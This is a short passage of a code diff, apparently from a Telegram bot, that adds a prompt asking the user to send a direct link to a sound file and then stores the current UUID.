+            '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴅɪʀᴇᴄᴛ ʟɪɴᴋ ᴏꜰ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ꜱᴏᴜɴᴅ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴛʜᴇ ꜱᴏᴜɴᴅ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ᴘʟᴀʏᴇᴅ',
             {reply_markup: {force_reply: true}, parse_mode: "HTML"}
         )
         currentUuid = uuid
